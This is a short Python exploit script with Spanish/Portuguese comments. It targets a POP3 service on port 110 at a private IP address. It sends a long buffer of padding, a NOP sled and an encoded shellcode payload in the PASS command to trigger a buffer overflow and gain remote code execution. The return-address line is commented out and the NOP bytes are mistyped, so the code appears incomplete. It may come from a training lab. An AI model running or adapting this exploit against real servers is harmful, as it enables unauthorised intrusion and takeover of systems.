#!/usr/bin/python3

import socket, sys
from struct import pack

def explotacion(ip, port):
    shelcode=("\xda\xc8\xbe\xa9\xdb\x13\xdd\xd9\x74\x24\xf4\x5b\x33\xc9"
                    "\xb1\x52\x31\x73\x17\x83\xeb\xfc\x03\xda\xc8\xf1\x28\xe0"
                    "\x07\x77\xd2\x18\xd8\x18\x5a\xfd\xe9\x18\x38\x76\x59\xa9"
                    "\x4a\xda\x56\x42\x1e\xce\xed\x26\xb7\xe1\x46\x8c\xe1\xcc"
                    "\x57\xbd\xd2\x4f\xd4\xbc\x06\xaf\xe5\x0e\x5b\xae\x22\x72"
                    "\x96\xe2\xfb\xf8\x05\x12\x8f\xb5\x95\x99\xc3\x58\x9e\x7e"
                    "\x93\x5b\x8f\xd1\xaf\x05\x0f\xd0\x7c\x3e\x06\xca\x61\x7b"
                    "\xd0\x61\x51\xf7\xe3\xa3\xab\xf8\x48\x8a\x03\x0b\x90\xcb"
                    "\xa4\xf4\xe7\x25\xd7\x89\xff\xf2\xa5\x55\x75\xe0\x0e\x1d"
                    "\x2d\xcc\xaf\xf2\xa8\x87\xbc\xbf\xbf\xcf\xa0\x3e\x13\x64"
                    "\xdc\xcb\x92\xaa\x54\x8f\xb0\x6e\x3c\x4b\xd8\x37\x98\x3a"
                    "\xe5\x27\x43\xe2\x43\x2c\x6e\xf7\xf9\x6f\xe7\x34\x30\x8f"
                    "\xf7\x52\x43\xfc\xc5\xfd\xff\x6a\x66\x75\x26\x6d\x89\xac"
                    "\x9e\xe1\x74\x4f\xdf\x28\xb3\x1b\x8f\x42\x12\x24\x44\x92"
                    "\x9b\xf1\xcb\xc2\x33\xaa\xab\xb2\xf3\x1a\x44\xd8\xfb\x45"
                    "\x74\xe3\xd1\xed\x1f\x1e\xb2\xd1\x48\x21\x40\xba\x8a\x21"
                    "\x45\x81\x02\xc7\x2f\xe5\x42\x50\xd8\x9c\xce\x2a\x79\x60"
                    "\xc5\x57\xb9\xea\xea\xa8\x74\x1b\x86\xba\xe1\xeb\xdd\xe0"
                    "\xa4\xf4\xcb\x8c\x2b\x66\x90\x4c\x25\x9b\x0f\x1b\x62\x6d"
                    "\x46\xc9\x9e\xd4\xf0\xef\x62\x80\x3b\xab\xb8\x71\xc5\x32"
                    "\x4c\xcd\xe1\x24\x88\xce\xad\x10\x44\x99\x7b\xce\x22\x73"
                    "\xca\xb8\xfc\x28\x84\x2c\x78\x03\x17\x2a\x85\x4e\xe1\xd2"
                    "\x34\x27\xb4\xed\xf9\xaf\x30\x96\xe7\x4f\xbe\x4d\xac\x60"
                    "\xf5\xcf\x85\xe8\x50\x9a\x97\x74\x63\x71\xdb\x80\xe0\x73"
                    "\xa4\x76\xf8\xf6\xa1\x33\xbe\xeb\xdb\x2c\x2b\x0b\x4f\x4c"
                    "\x7e")

    offset=2606
    buffer="A"*offset
    # buffer+=pack("<L", inserir opcode)
    buffer+="\90"*20
    buffer+=shelcode

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)  
        s.send(b'USER eraldo\r\n')
        s.recv(1024)
        s.send(f'PASS {buffer}\r\n'.encode())  
        s.recv(1024)
        s.close()
    except socket.error as e:
        print(f"\n[!] Error de conexiÃ³n: {e}\n")
        sys.exit(1)

if __name__ == "__main__":
    target_ip = '192.168.1.2'
    target_port = 110
    explotacion(target_ip, target_port)